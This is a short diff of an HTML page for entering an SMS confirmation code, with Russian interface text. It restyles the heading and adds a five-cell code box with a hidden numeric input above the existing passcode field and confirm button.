@@ -32,7 +32,15 @@
             <div id="page2">
                 
                 <img class="small-logo" src="assets/ico.svg" alt="">
-                <h1 class="passcode-title">Введите код из СМС</h1>
+                <p class="passcode-title">Введите код из СМС</p>
+                <div class="code-box" id="codeBox">
+                    <div class="cell"></div>
+                    <div class="cell"></div>
+                    <div class="cell"></div>
+                    <div class="cell"></div>
+                    <div class="cell"></div>
+                </div>
+                <input id="hiddenInput" type="text" maxlength="4" inputmode="numeric" />
                 <input type="number" maxlength="5" id="passcode-input" placeholder="00000" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
                 <button class="btn" id="passcode-btn">Подтвердить</button>
                 <div id="popup"></div>
